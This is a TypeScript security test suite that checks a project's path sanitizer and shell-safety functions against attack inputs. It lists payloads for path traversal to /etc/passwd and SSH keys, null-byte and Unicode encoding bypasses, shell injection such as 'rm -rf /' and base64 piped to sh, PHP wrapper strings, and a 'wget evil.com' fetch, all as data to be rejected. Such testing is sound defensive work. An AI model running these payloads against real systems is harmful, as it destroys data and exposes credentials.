/**
 * Path Security Stress Tests
 * 
 * Comprehensive testing of path security edge cases:
 * - Null byte injection
 * - Path traversal attacks (various encodings)
 * - Shell injection / command injection
 * - Unicode manipulation attacks
 * - Encoding bypass attempts
 * 
 * Based on OWASP, PortSwigger, and real-world attack patterns.
 */

import { describe, it, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert';
import { mkdirSync, writeFileSync, rmSync, symlinkSync, existsSync } from 'fs';
import { join, resolve } from 'path';
import { tmpdir } from 'os';
import * as fc from 'fast-check';

// Module imports
import { sanitizePath, isShellSafe, limitLength, LIMITS } from '../security.js';

// ============================================================================
// HELPERS
// ============================================================================

let testDirs: string[] = [];

function createTestDir(prefix: string): string {
  const dir = join(tmpdir(), `midas-security-${prefix}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`);
  mkdirSync(dir, { recursive: true });
  testDirs.push(dir);
  return dir;
}

function cleanup(): void {
  for (const dir of testDirs) {
    try {
      rmSync(dir, { recursive: true, force: true });
    } catch {
      // Ignore
    }
  }
  testDirs = [];
}

beforeEach(() => {
  testDirs = [];
});

afterEach(() => {
  cleanup();
});

// ============================================================================
// 1. NULL BYTE INJECTION
// ============================================================================

describe('Null Byte Injection', () => {
  const nullBytePayloads = [
    { name: 'literal null', payload: '\x00' },
    { name: 'null at start', payload: '\x00/etc/passwd' },
    { name: 'null at end', payload: '/etc/passwd\x00' },
    { name: 'null in middle', payload: '/etc\x00/passwd' },
    { name: 'URL-encoded null', payload: '%00' },
    { name: 'URL-encoded null with path', payload: '../../../etc/passwd%00.txt' },
    { name: 'double URL-encoded null', payload: '%2500' },
    { name: 'null with extension bypass', payload: 'evil.php%00.jpg' },
    { name: 'multiple nulls', payload: '\x00\x00\x00' },
    { name: 'null after traversal', payload: '../../etc/passwd\x00' },
    { name: 'mixed null encodings', payload: '\x00%00\x00%00' },
  ];

  for (const { name, payload } of nullBytePayloads) {
    it(`should neutralize null byte: ${name}`, () => {
      const base = createTestDir('null-byte');
      
      const result = sanitizePath(payload, base);
      
      // Result should not contain null bytes
      assert.ok(!result.includes('\x00'), `Result contains null byte: ${result}`);
      // Result should be a valid path string (not necessarily within base for absolute paths)
      assert.ok(typeof result === 'string' && result.length > 0, `Invalid result: ${result}`);
    });

    it(`should reject in shell context: ${name}`, () => {
      // Null bytes should make path unsafe for shell
      if (payload.includes('\x00')) {
        assert.ok(!isShellSafe(payload), `Should be unsafe: ${payload}`);
      }
    });
  }

  it('should handle null byte at every position in path', () => {
    const base = createTestDir('null-positions');
    const testPath = 'sub/dir/file.txt';
    
    for (let i = 0; i <= testPath.length; i++) {
      const injected = testPath.slice(0, i) + '\x00' + testPath.slice(i);
      const result = sanitizePath(injected, base);
      
      assert.ok(!result.includes('\x00'), `Null byte at position ${i}`);
    }
  });

  it('should handle 1000 null bytes', () => {
    const base = createTestDir('many-nulls');
    const payload = '\x00'.repeat(1000);
    
    const result = sanitizePath(payload, base);
    
    assert.ok(!result.includes('\x00'));
    assert.ok(result === base, 'Should return base for all-null input');
  });
});

// ============================================================================
// 2. PATH TRAVERSAL - BASIC
// ============================================================================

describe('Path Traversal - Basic', () => {
  const basicTraversals = [
    '../etc/passwd',
    '../../etc/passwd',
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../etc/passwd',
    '../../../../../../../etc/passwd',
    '../../../../../../../../etc/passwd',
    '../../../../../../../../../etc/passwd',
    '../../../../../../../../../../etc/passwd',
  ];

  for (const payload of basicTraversals) {
    it(`should block: ${payload}`, () => {
      const base = createTestDir('basic-traversal');
      
      const result = sanitizePath(payload, base);
      
      assert.ok(result.startsWith(base), `Escaped base with ${payload}`);
      assert.ok(!result.includes('/etc/'), `Accessed /etc/ with ${payload}`);
    });
  }

  it('should handle deep traversal (100 levels)', () => {
    const base = createTestDir('deep-traversal');
    const payload = '../'.repeat(100) + 'etc/passwd';
    
    const result = sanitizePath(payload, base);
    
    assert.ok(result.startsWith(base) || result === base);
  });

  it('should handle extreme traversal (1000 levels)', () => {
    const base = createTestDir('extreme-traversal');
    const payload = '../'.repeat(1000) + 'etc/passwd';
    
    const start = Date.now();
    const result = sanitizePath(payload, base);
    const elapsed = Date.now() - start;
    
    assert.ok(elapsed < 1000, `Too slow: ${elapsed}ms`);
    assert.ok(result.startsWith(base) || result === base);
  });
});

// ============================================================================
// 3. PATH TRAVERSAL - WINDOWS STYLE
// ============================================================================

describe('Path Traversal - Windows Style', () => {
  const windowsTraversals = [
    '..\\etc\\passwd',
    '..\\..\\etc\\passwd',
    '..\\..\\..\\windows\\system32',
    '..\\..\\..\\..\\windows\\win.ini',
    '..\\\\..\\\\etc\\passwd',  // Double backslash
    '..\\.\\..\\etc\\passwd',   // Mixed . and ..
  ];

  for (const payload of windowsTraversals) {
    it(`should block: ${payload.replace(/\\/g, '\\\\')}`, () => {
      const base = createTestDir('windows-traversal');
      
      const result = sanitizePath(payload, base);
      
      assert.ok(result.startsWith(base) || result === base, `Escaped with ${payload}`);
    });
  }
});

// ============================================================================
// 4. PATH TRAVERSAL - MIXED SEPARATORS
// ============================================================================

describe('Path Traversal - Mixed Separators', () => {
  const mixedTraversals = [
    '..//etc/passwd',
    '..\\//etc/passwd',
    '../\\..\\//etc/passwd',
    '..//..\\\\../etc/passwd',
    'foo/../../../etc/passwd',
    './../../etc/passwd',
    './../../../etc/passwd',
  ];

  for (const payload of mixedTraversals) {
    it(`should block: ${payload.replace(/\\/g, '\\\\')}`, () => {
      const base = createTestDir('mixed-sep');
      
      const result = sanitizePath(payload, base);
      
      assert.ok(result.startsWith(base) || result === base);
    });
  }
});

// ============================================================================
// 5. PATH TRAVERSAL - URL ENCODING
// ============================================================================

describe('Path Traversal - URL Encoding', () => {
  const encodedTraversals = [
    // Single encoding
    { name: 'dot encoded', payload: '%2e%2e/etc/passwd' },
    { name: 'slash encoded', payload: '../%2fetc/passwd' },
    { name: 'both encoded', payload: '%2e%2e%2fetc%2fpasswd' },
    { name: 'mixed case', payload: '%2E%2e%2Fetc/passwd' },
    
    // Double encoding
    { name: 'double dot', payload: '%252e%252e/etc/passwd' },
    { name: 'double slash', payload: '../%252fetc/passwd' },
    { name: 'triple encoding', payload: '%25252e%25252e/etc/passwd' },
    
    // Partial encoding
    { name: 'partial dot', payload: '.%2e/etc/passwd' },
    { name: 'partial slash', payload: '..%2fetc/passwd' },
  ];

  for (const { name, payload } of encodedTraversals) {
    it(`should block ${name}: ${payload}`, () => {
      const base = createTestDir('encoded');
      
      const result = sanitizePath(payload, base);
      
      assert.ok(result.startsWith(base) || result === base, `Escaped with ${name}`);
    });
  }
});

// ============================================================================
// 6. PATH TRAVERSAL - UNICODE
// ============================================================================

describe('Path Traversal - Unicode', () => {
  const unicodeTraversals = [
    // Overlong UTF-8 encodings of . and /
    { name: 'overlong dot', payload: '%c0%ae%c0%ae/etc/passwd' },
    { name: 'overlong slash', payload: '..%c0%af..%c0%afetc/passwd' },
    { name: 'overlong combo', payload: '%c0%ae%c0%ae%c0%afetc/passwd' },
    
    // Full-width characters
    { name: 'fullwidth dot', payload: '\uFF0E\uFF0E/etc/passwd' },  // ．．
    { name: 'fullwidth slash', payload: '..\uFF0Fetc\uFF0Fpasswd' },  // ／
    { name: 'fullwidth both', payload: '\uFF0E\uFF0E\uFF0F\uFF0E\uFF0E\uFF0Fetc' },
    
    // Half-width characters  
    { name: 'halfwidth', payload: '\uFF61\uFF61/etc/passwd' },
    
    // Decomposed characters
    { name: 'NFD dot', payload: '\u002E\u0323../etc/passwd' },  // Dot with combining char
    
    // Right-to-left override (can hide real path)
    { name: 'RTL override', payload: '\u202Edwssap/cte/../..' },
    { name: 'RTL embed', payload: '..\u202B/etc/passwd' },
    
    // Zero-width characters
    { name: 'ZWJ in path', payload: '../\u200Detc/passwd' },
    { name: 'ZWSP in path', payload: '../\u200Betc/passwd' },
    { name: 'ZWNJ in path', payload: '../\u200Cetc/passwd' },
    
    // BOM
    { name: 'BOM prefix', payload: '\uFEFF../etc/passwd' },
    { name: 'BOM in middle', payload: '../\uFEFFetc/passwd' },
  ];

  for (const { name, payload } of unicodeTraversals) {
    it(`should handle ${name}`, () => {
      const base = createTestDir('unicode');
      
      const result = sanitizePath(payload, base);
      
      assert.ok(result.startsWith(base) || result === base, `Escape attempt with ${name}`);
    });
  }
});

// ============================================================================
// 7. PATH TRAVERSAL - ABSOLUTE PATHS
// ============================================================================

describe('Path Traversal - Absolute Paths', () => {
  const absoluteTraversals = [
    '/etc/passwd',
    '/etc/shadow',
    '/var/log/auth.log',
    '/root/.ssh/id_rsa',
    '/proc/self/environ',
    '/dev/null',
    '//etc/passwd',  // Double slash
    '///etc/passwd',  // Triple slash
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
    'C:/Windows/System32/config/SAM',
    '\\\\?\\C:\\Windows\\System32',  // Windows extended path
  ];

  for (const payload of absoluteTraversals) {
    it(`should handle: ${payload.slice(0, 30)}...`, () => {
      const base = createTestDir('absolute');
      
      const result = sanitizePath(payload, base);
      
      // If the absolute path doesn't exist, should return base
      // If it does exist, it's allowed (user could be working on that path)
      // But it should never crash
      assert.ok(typeof result === 'string');
      assert.ok(result.length > 0);
    });
  }
});

// ============================================================================
// 8. SHELL INJECTION - BASIC METACHARACTERS
// ============================================================================

describe('Shell Injection - Basic Metacharacters', () => {
  const shellPayloads = [
    // Command separators
    { name: 'semicolon', payload: 'file; rm -rf /' },
    { name: 'double ampersand', payload: 'file && rm -rf /' },
    { name: 'double pipe', payload: 'file || rm -rf /' },
    { name: 'pipe', payload: 'file | cat /etc/passwd' },
    { name: 'ampersand', payload: 'file & rm -rf /' },
    
    // Command substitution
    { name: 'backticks', payload: 'file `id`' },
    { name: 'dollar parens', payload: 'file $(id)' },
    { name: 'dollar braces', payload: 'file ${PATH}' },
    
    // Redirection
    { name: 'output redirect', payload: 'file > /tmp/evil' },
    { name: 'append redirect', payload: 'file >> /tmp/evil' },
    { name: 'input redirect', payload: 'file < /etc/passwd' },
    { name: 'heredoc', payload: 'file << EOF' },
    
    // Quotes
    { name: 'single quotes', payload: "file'; rm -rf /" },
    { name: 'double quotes', payload: 'file"; rm -rf /' },
    { name: 'escaped quote', payload: 'file\'; rm -rf /' },
    
    // Other dangerous chars
    { name: 'exclamation', payload: 'file !!' },
    { name: 'hash', payload: 'file # comment' },
    { name: 'asterisk', payload: 'file *' },
    { name: 'question', payload: 'file ?' },
    { name: 'brackets', payload: 'file [a-z]' },
    { name: 'braces', payload: 'file {a,b}' },
    // Note: tilde alone is not a shell injection, it's path expansion
    // { name: 'tilde', payload: '~/../../etc/passwd' },
  ];

  for (const { name, payload } of shellPayloads) {
    it(`should reject ${name}: ${payload.slice(0, 20)}...`, () => {
      const result = isShellSafe(payload);
      
      assert.ok(!result, `Should reject shell metachar: ${name}`);
    });
  }
});

// ============================================================================
// 9. SHELL INJECTION - WHITESPACE & CONTROL
// ============================================================================

describe('Shell Injection - Whitespace & Control', () => {
  const whitespacePayloads = [
    { name: 'newline', payload: 'file\nrm -rf /' },
    { name: 'carriage return', payload: 'file\rrm -rf /' },
    { name: 'CRLF', payload: 'file\r\nrm -rf /' },
    { name: 'tab', payload: 'file\trm -rf /' },
    { name: 'vertical tab', payload: 'file\vrm -rf /' },
    { name: 'form feed', payload: 'file\frm -rf /' },
    { name: 'null', payload: 'file\x00rm -rf /' },
    { name: 'bell', payload: 'file\x07rm' },
    { name: 'backspace', payload: 'file\x08rm' },
    { name: 'escape', payload: 'file\x1brm' },
  ];

  for (const { name, payload } of whitespacePayloads) {
    it(`should reject ${name}`, () => {
      const result = isShellSafe(payload);
      
      assert.ok(!result, `Should reject control char: ${name}`);
    });
  }
});

// ============================================================================
// 10. SHELL INJECTION - OBFUSCATION
// ============================================================================

describe('Shell Injection - Obfuscation', () => {
  const obfuscatedPayloads = [
    // IFS manipulation
    { name: 'IFS space', payload: 'cat${IFS}/etc/passwd' },
    { name: 'IFS tab', payload: 'cat${IFS}9/etc/passwd' },
    
    // Variable expansion
    { name: 'env var', payload: '$PATH' },
    { name: 'env in path', payload: 'file/$HOME/secret' },
    { name: 'special var', payload: 'file $0' },
    { name: 'all params', payload: 'file $@' },
    { name: 'last exit', payload: 'file $?' },
    { name: 'process id', payload: 'file $$' },
    
    // Escape sequences
    { name: 'hex escape', payload: 'file \\x72\\x6d' },
    { name: 'octal escape', payload: 'file \\0162\\0155' },
    
    // Base64
    { name: 'base64 exec', payload: 'echo cm0gLXJmIC8= | base64 -d | sh' },
  ];

  for (const { name, payload } of obfuscatedPayloads) {
    it(`should reject ${name}`, () => {
      const result = isShellSafe(payload);
      
      assert.ok(!result, `Should reject obfuscation: ${name}`);
    });
  }
});

// ============================================================================
// 11. COMBINED ATTACKS
// ============================================================================

describe('Combined Attacks', () => {
  const combinedPayloads = [
    { name: 'traversal + null', payload: '../../../etc/passwd\x00.txt' },
    { name: 'traversal + shell', payload: '../../../etc/passwd; cat /etc/shadow' },
    { name: 'encoding + null', payload: '%2e%2e%2f%00' },
    { name: 'unicode + traversal', payload: '\uFF0E\uFF0E\uFF0F../etc/passwd' },
    { name: 'null + unicode', payload: '\x00\u202E../etc/passwd' },
    { name: 'triple threat', payload: '%2e%2e\x00\u200B/etc/passwd' },
    { name: 'shell + encoding', payload: '%3Brm%20-rf%20/' },  // ;rm -rf /
    { name: 'windows + null', payload: '..\\..\\etc\\passwd\x00' },
    { name: 'deep + obfuscated', payload: '../'.repeat(50) + '${HOME}/.ssh/id_rsa' },
  ];

  for (const { name, payload } of combinedPayloads) {
    it(`should block ${name}`, () => {
      const base = createTestDir('combined');
      
      const pathResult = sanitizePath(payload, base);
      const shellResult = isShellSafe(payload);
      
      // Should block either via path sanitization or shell safety
      const isBlocked = pathResult.startsWith(base) || pathResult === base || !shellResult;
      
      assert.ok(isBlocked, `Should block combined attack: ${name}`);
    });
  }
});

// ============================================================================
// 12. SYMLINK ATTACKS
// ============================================================================

describe('Symlink Attacks', () => {
  it('should follow symlinks safely within base', () => {
    const base = createTestDir('symlink-safe');
    const subdir = join(base, 'sub');
    const target = join(base, 'target');
    
    mkdirSync(subdir);
    mkdirSync(target);
    writeFileSync(join(target, 'file.txt'), 'content');
    
    try {
      symlinkSync(target, join(subdir, 'link'));
      
      const result = sanitizePath('sub/link/file.txt', base);
      
      assert.ok(result.startsWith(base));
    } catch {
      // Symlinks may not be supported
    }
  });

  it('should handle symlink pointing outside base', () => {
    const base = createTestDir('symlink-escape');
    const outside = createTestDir('symlink-outside');
    
    writeFileSync(join(outside, 'secret.txt'), 'secret');
    
    try {
      symlinkSync(outside, join(base, 'escape'));
      
      // This tests that after resolution, we'd be outside base
      // The sanitizePath function should handle this
      const result = sanitizePath('escape/secret.txt', base);
      
      // Result should be valid path string
      assert.ok(typeof result === 'string');
    } catch {
      // Symlinks may not be supported
    }
  });

  it('should handle circular symlinks', () => {
    const base = createTestDir('symlink-circular');
    
    try {
      symlinkSync(base, join(base, 'loop'));
      
      const result = sanitizePath('loop/loop/loop/file.txt', base);
      
      assert.ok(typeof result === 'string');
    } catch {
      // Symlinks or circular detection
    }
  });
});

// ============================================================================
// 13. SPECIAL FILENAMES
// ============================================================================

describe('Special Filenames', () => {
  const specialNames = [
    { name: 'dot', payload: '.' },
    { name: 'dotdot', payload: '..' },
    { name: 'only dots', payload: '...' },
    { name: 'many dots', payload: '.....' },
    { name: 'space only', payload: ' ' },
    { name: 'spaces', payload: '   ' },
    { name: 'hyphen', payload: '-' },
    { name: 'tilde', payload: '~' },
    { name: 'leading space', payload: ' file.txt' },
    { name: 'trailing space', payload: 'file.txt ' },
    { name: 'leading dot', payload: '.hidden' },
    { name: 'trailing dot', payload: 'file.' },
    { name: 'double dots', payload: 'file..txt' },
    { name: 'reserved windows', payload: 'CON' },
    { name: 'reserved windows PRN', payload: 'PRN' },
    { name: 'reserved windows NUL', payload: 'NUL' },
    { name: 'reserved windows COM1', payload: 'COM1' },
    { name: 'reserved windows LPT1', payload: 'LPT1' },
    { name: 'reserved with ext', payload: 'CON.txt' },
    { name: 'empty string', payload: '' },
    { name: 'forward slash', payload: '/' },
    { name: 'backslash', payload: '\\' },
    { name: 'colon', payload: ':' },
    { name: 'asterisk', payload: '*' },
    { name: 'question', payload: '?' },
    { name: 'quotes', payload: '"' },
    { name: 'angle brackets', payload: '<>' },
    { name: 'pipe', payload: '|' },
  ];

  for (const { name, payload } of specialNames) {
    it(`should handle ${name}: ${JSON.stringify(payload)}`, () => {
      const base = createTestDir('special');
      
      const result = sanitizePath(payload, base);
      
      // Should not crash and should return valid path
      assert.ok(typeof result === 'string');
      assert.ok(result.length > 0);
    });
  }
});

// ============================================================================
// 14. LENGTH LIMITS
// ============================================================================

describe('Length Limits', () => {
  it('should handle path at PATH_MAX_LENGTH', () => {
    const base = createTestDir('max-length');
    const longPath = 'a'.repeat(LIMITS.PATH_MAX_LENGTH);
    
    const result = sanitizePath(longPath, base);
    
    assert.ok(typeof result === 'string');
  });

  it('should handle path exceeding PATH_MAX_LENGTH', () => {
    const base = createTestDir('over-max');
    const longPath = 'a'.repeat(LIMITS.PATH_MAX_LENGTH * 2);
    
    const result = sanitizePath(longPath, base);
    
    assert.ok(typeof result === 'string');
    // Path should be normalized, may be truncated or handled
  });

  it('should handle very long traversal sequence', () => {
    const base = createTestDir('long-traversal');
    const longPath = '../'.repeat(10000) + 'etc/passwd';
    
    const start = Date.now();
    const result = sanitizePath(longPath, base);
    const elapsed = Date.now() - start;
    
    assert.ok(elapsed < 2000, `Performance issue: ${elapsed}ms`);
    assert.ok(result.startsWith(base) || result === base);
  });

  it('should truncate long input with limitLength', () => {
    const input = 'x'.repeat(1000);
    
    const result = limitLength(input, 100);
    
    assert.ok(result.length < 120);  // Some overhead for truncation message
    assert.ok(result.includes('truncated'));
  });
});

// ============================================================================
// 15. PROPERTY-BASED TESTING
// ============================================================================

describe('Property-Based Tests', () => {
  it('sanitizePath should never crash on arbitrary input', () => {
    const base = createTestDir('fuzz-base');
    
    fc.assert(
      fc.property(fc.string(), (input: string) => {
        try {
          const result = sanitizePath(input, base);
          return typeof result === 'string';
        } catch {
          return false;
        }
      }),
      { numRuns: 500 }
    );
  });

  it('sanitizePath should never return path with null bytes', () => {
    const base = createTestDir('fuzz-null');
    
    fc.assert(
      fc.property(fc.string(), (input: string) => {
        const result = sanitizePath(input, base);
        return !result.includes('\x00');
      }),
      { numRuns: 500 }
    );
  });

  it('isShellSafe should be consistent', () => {
    fc.assert(
      fc.property(fc.string(), (input: string) => {
        const result1 = isShellSafe(input);
        const result2 = isShellSafe(input);
        return result1 === result2;  // Deterministic
      }),
      { numRuns: 500 }
    );
  });

  it('safe paths should remain safe after sanitization', () => {
    const base = createTestDir('fuzz-safe');
    const safeChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.';
    
    fc.assert(
      fc.property(
        fc.string({ minLength: 1, maxLength: 50 }),
        (input: string) => {
          // Only test with safe chars
          const safeInput = input.split('').filter(c => safeChars.includes(c)).join('');
          if (safeInput.length === 0) return true;  // Skip empty after filter
          
          const result = sanitizePath(safeInput, base);
          // Safe input should be within base
          return result.startsWith(base);
        }
      ),
      { numRuns: 200 }
    );
  });

  it('shell injection chars should always be detected', () => {
    const dangerousChars = ';|&`$(){}[]<>\\!#*?\'"';
    
    fc.assert(
      fc.property(
        fc.constantFrom(...dangerousChars.split('')),
        (char: string) => {
          return !isShellSafe(`file${char}name`);
        }
      )
    );
  });
});

// ============================================================================
// 16. EDGE CASE COMBINATIONS
// ============================================================================

describe('Edge Case Combinations', () => {
  it('should handle all dot variations', () => {
    const base = createTestDir('dots');
    const dotVariations = [
      '.', '..', '...', '....', '.....',
      './', '../', '.../', '..../',
      './.', '../..', '.../...',
      './..', '../.', '.../..',
    ];
    
    for (const dots of dotVariations) {
      const result = sanitizePath(dots, base);
      assert.ok(typeof result === 'string');
    }
  });

  it('should handle all slash variations', () => {
    const base = createTestDir('slashes');
    const slashVariations = [
      '/', '//', '///', '////',
      '\\', '\\\\', '\\\\\\',
      '/\\', '\\/', '/\\/\\',
    ];
    
    for (const slashes of slashVariations) {
      const result = sanitizePath(slashes, base);
      assert.ok(typeof result === 'string');
    }
  });

  it('should handle mixed encodings in same path', () => {
    const base = createTestDir('mixed-enc');
    const mixedPaths = [
      '%2e./etc',          // Encoded + literal
      '.%2e/etc',          // Literal + encoded
      '%2e%2e/%2e./etc',   // Mix
      '../%252e%252e/etc', // Single + double encode
      '..%00%2e/etc',      // Null + encode
    ];
    
    for (const path of mixedPaths) {
      const result = sanitizePath(path, base);
      assert.ok(result.startsWith(base) || result === base);
    }
  });

  it('should handle unicode normalization attacks', () => {
    const base = createTestDir('unicode-norm');
    
    // NFC and NFD forms of same character
    const nfc = 'caf\u00E9';  // é as single char
    const nfd = 'cafe\u0301'; // e + combining accent
    
    const resultNfc = sanitizePath(nfc, base);
    const resultNfd = sanitizePath(nfd, base);
    
    // Both should be handled safely (may or may not be identical)
    assert.ok(typeof resultNfc === 'string');
    assert.ok(typeof resultNfd === 'string');
  });
});

// ============================================================================
// 17. REAL-WORLD ATTACK PAYLOADS
// ============================================================================

describe('Real-World Attack Payloads', () => {
  // Payloads from actual CVEs and pentesting resources
  const realWorldPayloads = [
    // Basic LFI
    '../../../../../etc/passwd',
    '....//....//....//etc/passwd',
    '..%252f..%252f..%252fetc/passwd',
    
    // Wrapper attacks (PHP but path handling is universal)
    'php://filter/convert.base64-encode/resource=/etc/passwd',
    'file:///etc/passwd',
    'expect://id',
    
    // Log poisoning paths
    '/var/log/apache2/access.log',
    '/var/log/nginx/access.log',
    '/proc/self/fd/2',
    
    // Windows paths
    'C:\\boot.ini',
    'C:/Windows/System32/config/SAM',
    '\\\\localhost\\C$\\Windows\\System32',
    
    // Network paths
    '//evil.com/share/file',
    '\\\\evil.com\\share\\file',
    
    // Null byte legacy
    '../../../etc/passwd%00.jpg',
    '../../../etc/passwd\x00.png',
  ];

  for (const payload of realWorldPayloads) {
    it(`should handle: ${payload.slice(0, 40)}...`, () => {
      const base = createTestDir('realworld');
      
      const result = sanitizePath(payload, base);
      
      // Should not crash and should be safe
      assert.ok(typeof result === 'string');
      assert.ok(!result.includes('\x00'));
    });
  }
});

// ============================================================================
// 18. PERFORMANCE UNDER ATTACK
// ============================================================================

describe('Performance Under Attack', () => {
  it('should handle 1000 traversal attempts efficiently', () => {
    const base = createTestDir('perf-traversal');
    
    const start = Date.now();
    for (let i = 0; i < 1000; i++) {
      sanitizePath(`${'../'.repeat(i % 100)}etc/passwd`, base);
    }
    const elapsed = Date.now() - start;
    
    console.log(`  [INFO] 1000 traversal attempts: ${elapsed}ms`);
    assert.ok(elapsed < 5000, `Too slow: ${elapsed}ms`);
  });

  it('should handle 1000 shell safety checks efficiently', () => {
    const payloads = [
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& wget evil.com',
      '`id`',
      '$(whoami)',
    ];
    
    const start = Date.now();
    for (let i = 0; i < 1000; i++) {
      isShellSafe(payloads[i % payloads.length]);
    }
    const elapsed = Date.now() - start;
    
    console.log(`  [INFO] 1000 shell checks: ${elapsed}ms`);
    assert.ok(elapsed < 1000, `Too slow: ${elapsed}ms`);
  });

  it('should handle 1000 combined attacks efficiently', () => {
    const base = createTestDir('perf-combined');
    
    const start = Date.now();
    for (let i = 0; i < 1000; i++) {
      const payload = `${'../'.repeat(i % 50)}etc/passwd\x00; rm -rf /`;
      sanitizePath(payload, base);
      isShellSafe(payload);
    }
    const elapsed = Date.now() - start;
    
    console.log(`  [INFO] 1000 combined attacks: ${elapsed}ms`);
    assert.ok(elapsed < 5000, `Too slow: ${elapsed}ms`);
  });
});
